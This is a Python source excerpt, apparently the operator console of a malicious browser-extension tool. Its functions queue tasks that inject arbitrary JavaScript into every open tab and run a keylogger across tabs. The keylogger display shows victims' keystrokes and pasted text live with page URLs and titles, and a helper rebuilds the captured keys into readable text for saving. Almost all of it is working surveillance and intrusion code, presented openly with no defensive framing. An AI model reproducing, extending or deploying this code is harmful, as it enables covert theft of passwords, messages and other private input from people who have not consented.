def inject_javascript(filepath):
    """Read a local .js file and execute it in all browser tabs via the extension."""
    filepath = os.path.expanduser(filepath)
    if not os.path.isfile(filepath):
        print(f"  {RED}[!] File not found: {filepath}{RESET}")
        return None

    with open(filepath, 'r') as f:
        code = f.read()

    if not code.strip():
        print(f"  {RED}[!] File is empty: {filepath}{RESET}")
        return None

    print(f"  {CYAN}[*] Loaded {len(code)} bytes from {filepath}{RESET}")

    tid, evt = submit_task(task_type='inject_js', code=code)

    print(f"  {YELLOW}[*] JS injection task #{tid} queued, waiting...{RESET}", end='', flush=True)
    result = wait_result(tid, evt, timeout=60)
    print(f"\r" + " " * 60 + "\r", end='')

    if not result:
        print(f"  {RED}[!] Timeout — no response from extension{RESET}")
        return None

    if 'error' in result:
        print(f"  {RED}[!] Error: {result['error']}{RESET}")
        return None

    tabs_injected = result.get('tabs_injected', 0)
    results = result.get('results', [])

    print(f"  {GREEN}{BOLD}[+] JS injected into {tabs_injected} tab(s):{RESET}\n")

    for tab_result in results:
        tab_id = tab_result.get('tabId', '?')
        tab_url = tab_result.get('url', '(unknown)')

        if 'error' in tab_result:
            print(f"  {RED}[Tab {tab_id}] {tab_url}{RESET}")
            print(f"    {RED}Error: {tab_result['error']}{RESET}")
        else:
            print(f"  {GREEN}[Tab {tab_id}] {tab_url}{RESET}")
            for frame in tab_result.get('results', []):
                frame_id = frame.get('frameId', 0)
                ret_val  = frame.get('result', None)
                if ret_val is not None:
                    # Truncate long return values
                    ret_str = str(ret_val)
                    if len(ret_str) > 200:
                        ret_str = ret_str[:197] + '...'
                    print(f"    {CYAN}frame {frame_id} returned:{RESET} {ret_str}")
                else:
                    print(f"    {CYAN}frame {frame_id}:{RESET} (no return value)")
        print()

    return results


# ──────────────────────────────────────────────────────
# KEYLOGGER
# ──────────────────────────────────────────────────────

def start_keylogger():
    """Send keylogger_start task to the extension."""
    global TASK_ID
    with LOCK:
        TASK_ID += 1
        tid = TASK_ID
    evt = threading.Event()
    with LOCK:
        RESULT_EVENTS[tid] = evt
    task = {'id': tid, 'type': 'keylogger_start'}
    TASK_QUEUE.put(task)

    print(f"  {YELLOW}[*] Keylogger start task #{tid} queued...{RESET}", end='', flush=True)
    result = wait_result(tid, evt, timeout=30)
    print(f"\r" + " " * 60 + "\r", end='')

    if not result:
        print(f"  {RED}[!] Timeout — no response from extension{RESET}")
        return False
    if 'error' in result:
        print(f"  {RED}[!] Error: {result['error']}{RESET}")
        return False

    injected = result.get('tabs_injected', 0)
    total    = result.get('tabs_total', 0)
    print(f"  {GREEN}{BOLD}[+] Keylogger injected into {injected}/{total} tab(s){RESET}")
    return True


def stop_keylogger():
    """Send keylogger_stop task to the extension."""
    global TASK_ID
    with LOCK:
        TASK_ID += 1
        tid = TASK_ID
    evt = threading.Event()
    with LOCK:
        RESULT_EVENTS[tid] = evt
    task = {'id': tid, 'type': 'keylogger_stop'}
    TASK_QUEUE.put(task)

    print(f"  {YELLOW}[*] Stopping keylogger...{RESET}", end='', flush=True)
    result = wait_result(tid, evt, timeout=15)
    print(f"\r" + " " * 60 + "\r", end='')

    if not result:
        print(f"  {RED}[!] Timeout stopping keylogger{RESET}")
        return
    if 'error' in result:
        print(f"  {RED}[!] Error: {result['error']}{RESET}")
        return

    cleaned = result.get('tabs_cleaned', 0)
    print(f"  {GREEN}[+] Keylogger removed from {cleaned} tab(s){RESET}")

    # Drain any remaining keylog data
    remaining = 0
    while not KEYLOG_QUEUE.empty():
        try:
            KEYLOG_QUEUE.get_nowait()
            remaining += 1
        except queue.Empty:
            break
    if remaining:
        print(f"  {YELLOW}[*] Flushed {remaining} queued keylog event(s){RESET}")


def run_keylogger_display():
    """
    Enter live keylogger display mode.
    Press Enter 3 times consecutively to exit and stop the keylogger.
    Returns (all_keys, all_events) for saving.
    """
    if not start_keylogger():
        return None, None

    print()
    print(f"  {BOLD}{CYAN}{'─' * 50}{RESET}")
    print(f"  {BOLD}LIVE KEYLOGGER{RESET} — press {YELLOW}Enter 3 times{RESET} to stop")
    print(f"  {BOLD}{CYAN}{'─' * 50}{RESET}")
    print()

    enter_count = 0
    last_url = None
    all_keys = []
    all_events = []  # raw event data for export

    try:
        while True:
            # Check for queued keylog data
            try:
                data = KEYLOG_QUEUE.get(timeout=0.3)
                enter_count = 0  # Reset enter counter on data received

                url   = data.get('url', '?')
                title = data.get('title', '')
                keys  = data.get('keys', [])
                ts    = data.get('ts', 0)

                if not keys:
                    continue

                # Store raw event
                all_events.append(data)

                # Print URL header when target changes
                if url != last_url:
                    t_str = time.strftime('%H:%M:%S', time.localtime(ts / 1000)) if ts else '??:??:??'
                    label = title if title else url
                    if len(label) > 60:
                        label = label[:57] + '...'
                    print(f"\n  {CYAN}[{t_str}] {BOLD}{label}{RESET}")
                    print(f"  {CYAN}{url}{RESET}")
                    last_url = url

                # Render keystrokes
                rendered = ''
                for k in keys:
                    all_keys.append(k)
                    if k.startswith('[PASTE:') and k.endswith(']'):
                        pasted = k[7:-1]
                        rendered += f'{BOLD}{YELLOW}[PASTE]{RESET}{GREEN}{pasted}{RESET}'
                    elif k == '[ENTER]':
                        rendered += f'{YELLOW}⏎{RESET}\n  '
                    elif k == '[SPACE]':
                        rendered += ' '
                    elif k == '[BS]':
                        rendered += f'{RED}⌫{RESET}'
                    elif k == '[TAB]':
                        rendered += f'{YELLOW}⇥{RESET}'
                    elif k.startswith('[') and k.endswith(']'):
                        rendered += f'{YELLOW}{k}{RESET}'
                    else:
                        rendered += f'{GREEN}{k}{RESET}'

                sys.stdout.write(f"  {rendered}")
                sys.stdout.flush()

            except queue.Empty:
                pass

            # Check for Enter key presses (user wants to exit)
            # We use a non-blocking approach via select on stdin
            import select
            if select.select([sys.stdin], [], [], 0)[0]:
                line = sys.stdin.readline()
                if line.strip() == '':
                    enter_count += 1
                    if enter_count >= 3:
                        break
                else:
                    enter_count = 0

    except KeyboardInterrupt:
        pass

    print(f"\n\n  {CYAN}{'─' * 50}{RESET}")
    print(f"  {BOLD}Keylogger session ended{RESET}")
    total_keys = len(all_keys)
    if total_keys:
        print(f"  {BLUE}Total keystrokes captured:{RESET} {total_keys}")
        print(f"  {YELLOW}[*] Use 'save <filename>' to export keylog data{RESET}")
    print(f"  {CYAN}{'─' * 50}{RESET}")
    print()

    stop_keylogger()

    return all_keys, all_events


def _keylog_to_text(keys):
    """Reconstruct human-readable text from a keylog key list."""
    text = []
    for k in keys:
        if k.startswith('[PASTE:') and k.endswith(']'):
            text.append(k[7:-1])
        elif k == '[ENTER]':
            text.append('\n')
        elif k == '[SPACE]':
            text.append(' ')
        elif k == '[TAB]':
            text.append('\t')
        elif k == '[BS]':
            if text:
                text.pop()
        elif k.startswith('[') and k.endswith(']'):
            # Special keys — keep as-is for context
            text.append(k)
        else:
            text.append(k)
    return ''.join(text)


